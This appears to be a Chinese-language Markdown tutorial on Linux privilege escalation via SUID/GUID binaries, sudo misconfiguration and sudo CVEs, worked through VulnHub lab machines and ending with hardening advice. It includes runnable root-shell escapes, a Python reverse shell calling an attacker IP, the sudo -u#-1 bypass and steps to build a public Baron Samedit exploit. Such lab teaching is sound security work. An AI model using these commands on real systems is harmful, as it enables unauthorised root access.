@@ -1,0 +1,198 @@
+## 概述
+
+本文档旨在深入探讨在 Linux 环境下，当攻击者获取到 Web 权限或普通用户权限后，如何利用 SUID、GUID、SUDO 配置不当以及相关 CVE 漏洞进行权限提升。我们将结合理论原理与实战演练，提供一份详尽的技术指南，帮助安全研究人员和系统管理员理解并防范此类攻击。
+
+---
+
+## 技术原理
+
+### SUID & GUID
+
+- **SUID (Set owner User ID upon execution)**：这是一种特殊的文件权限。通常，程序运行时会继承当前登录用户的权限。但如果一个可执行文件被设置了 SUID 位，那么任何用户在执行该文件时，都会临时获得该文件**所有者**的权限。例如，如果一个由 `root` 用户拥有的文件被设置了 SUID，那么普通用户执行它时，该进程的有效用户 ID (EUID) 将变为 `root` 的 UID (0)，从而获得超级用户权限。
+
+- **GUID (Set Group ID upon execution)**：与 SUID 类似，GUID 使得用户在执行文件时，可以临时获得该文件所属**用户组**的权限。
+
+攻击者通常会扫描系统中所有设置了 SUID/GUID 位的可执行文件，特别是那些可以用来执行命令或读写敏感文件的程序（如 `find`, `nmap`, `vim` 等），并利用它们来执行恶意操作，最终获取一个更高权限的 Shell。
+
+### SUDO & CVE
+
+- **SUDO (substitute user do)**：SUDO 是一种强大的工具，它允许系统管理员授权普通用户以超级用户或其他用户的身份执行特定的命令，而无需分享 `root` 用户的密码。所有授权规则都定义在 `/etc/sudoers` 文件中。如果配置不当，例如允许用户以 `root` 身份运行一个可以派生 Shell 的命令（如 `awk`, `python`, `less`），攻击者就能轻易地提升权限。
+
+- **SUDO CVE 漏洞**：
+    - **CVE-2019-14287 (Sudo a=-1)**：该漏洞允许一个在 `sudoers` 文件中被授权的用户，通过指定用户 ID 为 `-1` 或 `4294967295` 来绕过用户限制，从而以 `root` 身份执行命令，即使配置中明确禁止其以 `root` 身份运行。
+    - **CVE-2021-3156 (Baron Samedit)**：这是一个基于堆的缓冲区溢出漏洞，存在于 Sudo 的 1.8.2 到 1.8.31p2 以及 1.9.0 到 1.9.5p1 版本中。任何本地用户（无论是否在 `sudoers` 文件中）都可以利用此漏洞，在默认配置下获得 `root` 权限。
+
+---
+
+## 环境准备
+
+为了复现本文中的攻击场景，您需要准备以下环境。建议使用虚拟机以隔离风险。
+
+| 场景 | 靶机/环境 | 下载/搭建说明 |
+| :--- | :--- | :--- |
+| SUID/GUID 提权 | VulnHub: DC-1 | [https://www.vulnhub.com/entry/dc-1,292/](https://www.vulnhub.com/entry/dc-1,292/) |
+| SUID & SUDO 提权 | VulnHub: Toppo-1 | [https://www.vulnhub.com/entry/toppo-1,245/](https://www.vulnhub.com/entry/toppo-1,245/) <br> *搭建提示：创建任意虚拟机，然后将下载的 `toppo.vmdx` 文件替换新虚拟机的虚拟磁盘文件。* |
+| SUDO & Web 渗透 | VulnHub: DevGuru-1 | [https://www.vulnhub.com/entry/devguru-1,620/](https://www.vulnhub.com/entry/devguru-1,620/) |
+| SUDO CVE-2021-3156 | Kali Linux 2020 或其他包含漏洞版本的系统 | Sudo 版本需在 1.8.2 - 1.8.31p2 或 1.9.0 - 1.9.5p1 之间。 |
+
+---
+
+## 实战示例
+
+### 场景一：利用 SUID/GUID 提权
+
+在获取到目标服务器的普通用户权限后，首要任务之一就是寻找可利用的 SUID/GUID 文件。
+
+1.  **查找 SUID/GUID 文件**
+    使用 `find` 命令在整个文件系统中搜索设置了 SUID 或 GUID 权限位的文件。
+
+    ```bash
+    # 查找 SUID 文件
+    find / -perm -u=s -type f 2>/dev/null
+    
+    # 查找 GUID 文件
+    find / -perm -g=s -type f 2>/dev/null
+    ```
+
+2.  **漏洞利用**
+    在 `DC-1` 靶机中，我们发现 `/usr/bin/find` 命令被设置了 SUID 位。这意味着我们可以利用 `find` 的 `-exec` 参数以 `root` 权限执行任意命令。
+
+    ```bash
+    # 利用 find 命令的 SUID 权限获取一个 root shell
+    /usr/bin/find . -exec '/bin/sh' \;
+    ```
+
+    在 `Toppo-1` 靶机中，我们可能会发现 `python` 或 `mawk` 等具有 SUID 权限。
+
+    *   **利用 Python 反弹 Shell**：
+        假设攻击机 IP 为 `192.168.139.141`，并在 6666 端口监听。
+
+        ```bash
+        # 在攻击机上设置监听
+        nc -lvnp 6666
+        
+        # 在靶机上执行
+        /usr/bin/python2.7 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.139.141",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+        ```
+
+    *   **利用 mawk 获取 Shell**：
+
+        ```bash
+        /usr/bin/mawk 'BEGIN {system("/bin/sh")}'
+        ```
+
+### 场景二：利用 SUDO 配置不当提权
+
+如果当前用户被授予了某些命令的 SUDO 权限，检查这些命令是否可以被用来提权。
+
+1.  **检查 SUDO 权限**
+    使用 `sudo -l` 命令列出当前用户可以以其他用户身份（通常是 root）执行的命令。
+
+    ```bash
+    sudo -l
+    ```
+
+2.  **漏洞利用**
+    在 `Toppo-1` 靶机中，假设 `sudo -l` 显示用户可以无密码执行 `/usr/bin/awk`。
+
+    ```bash
+    # 利用 awk 的 SUDO 权限获取一个 root shell
+    sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+    ```
+
+### 场景三：多阶段渗透与 SUDO 提权 (DevGuru)
+
+这是一个更复杂的场景，结合了 Web 渗透和本地提权。
+
+1.  **信息收集与初始访问**：
+    *   通过目录扫描发现 `.git` 目录泄露。
+    *   使用 `GitHack` 等工具还原源码，在配置文件中找到数据库凭据。
+    *   利用凭据登录 `adminer.php` 数据库管理工具，修改 `gitea` 服务的用户密码。
+    *   登录 `gitea` 后台，利用 Webhook 或其他功能写入反弹 Shell，获得一个低权限用户（如 `git`）。
+
+2.  **本地提权**：
+    *   在获取到 Shell 后，上传并运行 `PEASS-ng` 等自动化枚举脚本，或手动执行 `sudo -l`。
+    *   发现当前用户可以利用 `sudo` 以特定用户身份执行 `sqlite3`。
+
+        ```bash
+        # 检查 sudo 权限
+        sudo -l
+        
+        # 输出可能类似于:
+        # (ALL, ALL, ALL) NOPASSWD: /usr/bin/sqlite3
+        ```
+
+    *   利用 `sqlite3` 的 `.shell` 命令执行 `/bin/sh`，并结合 `sudo -u#-1` (CVE-2019-14287) 漏洞绕过用户限制，获取 `root` Shell。
+
+        ```bash
+        sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'
+        ```
+
+### 场景四：利用 SUDO CVE-2021-3156 提权
+
+此漏洞影响范围广，利用条件简单。
+
+1.  **漏洞判断**：
+    执行以下命令，如果系统返回一个以 `sudoedit:` 开头的错误信息，而不是密码提示，则说明系统存在漏洞。
+
+    ```bash
+    sudoedit -s /
+    ```
+
+2.  **漏洞利用**：
+    *   下载并编译漏洞利用代码。
+
+        ```bash
+        git clone https://github.com/blasty/CVE-2021-3156.git
+        cd CVE-2021-3156
+        make
+        ```
+
+    *   执行 exploit 程序。参数 `0` 通常表示使用 `sudo-hax-me-a-sandwich` 作为载荷。
+
+        ```bash
+        chmod a+x sudo-hax-me-a-sandwich
+        ./sudo-hax-me-a-sandwich 0
+        ```
+
+    *   如果利用成功，你将直接获得一个 `root` 权限的 Shell。
+
+---
+
+## 关键细节
+
+- **GTFOBins 是你的好朋友**：[GTFOBins](https://gtfobins.github.io/) 是一个权威的参考网站，收录了大量 Unix/Linux 二进制文件如何被用于绕过本地安全限制。当你发现一个具有 SUID 或 SUDO 权限的二进制文件时，应首先在此网站上查找其利用方法。
+
+- **自动化枚举脚本**：在真实的渗透测试中，手动查找所有提权向量非常耗时。使用 `LinEnum.sh` 或 `PEASS-ng` ([https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)) 等脚本可以快速发现系统中的配置错误、敏感信息和潜在的提权路径。
+
+- **理解 `-exec` 和 `system()`**：许多提权技巧的核心是找到一个高权限进程，并让它执行一个能派生 Shell 的命令。`find -exec`、`awk 'BEGIN {system("/bin/sh")}'`、`python -c 'os.system("/bin/sh")'` 等都是实现这一目标的经典模式。
+
+---
+
+## 安全总结
+
+权限提升是攻击链中至关重要的一环。为了加固 Linux 系统，防范此类攻击，系统管理员应遵循以下最佳实践：
+
+1.  **最小权限原则**：
+    *   **SUID/GUID**：定期审查系统中设置了 SUID/GUID 的文件。除非绝对必要，否则应移除这些权限位 (`chmod u-s <file>`)。不要给脚本文件（如 Shell, Python 脚本）设置 SUID 位，因为这极易被利用。
+    *   **SUDO**：在配置 `/etc/sudoers` 时，应遵循最小权限原则。仅授权用户执行完成其工作所必需的特定命令，并尽可能避免授予能直接或间接执行 Shell 的命令（如 `sh`, `bash`, `vim`, `awk` 等）。
+
+2.  **及时更新与补丁管理**：
+    *   定期更新系统和软件包，特别是像 `sudo` 这样的核心组件，以修复已知的安全漏洞（如 CVE-2021-3156）。订阅相关的安全公告，保持对新漏洞的警惕。
+
+3.  **加强 Web 应用安全**：
+    *   许多本地提权的前提是攻击者通过 Web 漏洞获取了初始访问权限。因此，加固 Web 应用、防止源码泄露、使用强密码、修复 SQL 注入和文件上传等漏洞，是防御纵深的第一道防线。
+
+4.  **定期审计与监控**：
+    *   使用自动化工具定期扫描系统，检查是否存在不当的权限配置。
+    *   监控异常的进程执行和用户行为，特别是对 SUID/SUDO 命令的调用。
+
+通过结合严格的权限管理、及时的补丁策略和持续的安全监控，可以显著降低 Linux 系统被提权的风险。
+
+---
+---
+接下来，我们可以：
+
+*   将这些命令和脚本整理成一个自动化的 Linux 提权检测脚本。
+*   针对每种提权方式，制作一个简短的视频演示，以便更直观地理解攻击过程。
+*   深入研究 `PEASS-ng` 的源码，分析它是如何检测这些提权向量的。
